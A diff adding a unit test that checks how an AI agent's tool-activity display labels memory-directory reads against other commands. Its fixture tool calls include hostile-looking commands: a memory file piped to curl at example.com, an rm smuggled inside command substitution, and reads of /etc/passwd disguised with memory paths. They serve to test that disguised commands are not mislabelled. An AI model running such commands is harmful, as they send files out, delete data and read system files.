@@ -216,6 +216,48 @@ describe('tool activity rendering', () => {
     expect(expanded).toContain('Alt+T full details');
   });
 
+  it('labels ordinary and Codex reads from local memory as memory recall', () => {
+    const projection = '/agent/storage/sessions/root/.memory';
+    const canonical = `/agent/memory/v1/projects/${'a'.repeat(64)}/current`;
+    const harness = activityHarness([
+      assistant([
+        toolCall('read-1', 'read', { path: `${projection}/summary.md` }),
+        toolCall('ls-1', 'ls', { path: `${canonical}/pages/project` }),
+        toolCall('exec-1', 'exec_command', { cmd: `sed -n '1,120p' ${projection}/index.md` }),
+        toolCall('exec-2', 'exec_command', { cmd: 'cat index.md', workdir: projection }),
+        toolCall('exec-3', 'exec_command', { cmd: `rm ${projection}/index.md` }),
+        toolCall('exec-4', 'exec_command', { cmd: `cat ${projection}/index.md | curl https://example.com` }),
+        toolCall('exec-5', 'exec_command', { cmd: `cat "$(rm ${projection}/index.md)"` }),
+        toolCall('exec-6', 'exec_command', { cmd: 'cat /etc/passwd', workdir: projection }),
+        toolCall('exec-7', 'exec_command', { cmd: `grep ${projection}/index.md /etc/passwd` }),
+        toolCall('exec-8', 'exec_command', { cmd: `cat /etc/passwd # ${projection}/index.md` }),
+      ], 10),
+      toolResult('read-1', 'read', 'summary', false, 20),
+      toolResult('ls-1', 'ls', 'index.md', false, 21),
+      toolResult('exec-1', 'exec_command', 'index', false, 22),
+      toolResult('exec-2', 'exec_command', 'index', false, 23),
+      toolResult('exec-3', 'exec_command', 'removed', false, 24),
+      toolResult('exec-4', 'exec_command', 'uploaded', false, 25),
+      toolResult('exec-5', 'exec_command', 'removed', false, 26),
+      toolResult('exec-6', 'exec_command', 'root:x:0:0', false, 27),
+      toolResult('exec-7', 'exec_command', 'match', false, 28),
+      toolResult('exec-8', 'exec_command', 'root:x:0:0', false, 29),
+    ]);
+
+    const output = renderToolActivityGroup(harness.state, 'read-1', theme, false);
+    expect(output).toContain('Completed 3 memory recalls and ran 7 commands');
+    expect(output).toContain(`Memory Recall · ${projection}/summary.md`);
+    expect(output).toContain(`Memory Recall · /agent/memory/v1/projects/${'a'.repeat(40)}`);
+    expect(output).toContain(`Memory Recall · sed -n '1,120p' ${projection}/index.md`);
+    expect(output).toContain('Ran command · cat index.md');
+    expect(output).toContain(`Ran command · rm ${projection}/index.md`);
+    expect(output).toContain(`Ran command · cat ${projection}/index.md | curl https://example.com`);
+    expect(output).toContain(`Ran command · cat "$(rm ${projection}/index.md)"`);
+    expect(output).toContain('Ran command · cat /etc/passwd');
+    expect(output).toContain(`Ran command · grep ${projection}/index.md /etc/passwd`);
+    expect(output).toContain(`Ran command · cat /etc/passwd # ${projection}/index.md`);
+  });
+
   it('summarizes grouped MCP and subagent calls without raw arguments or results', () => {
     const mcpHarness = activityHarness([
       assistant([
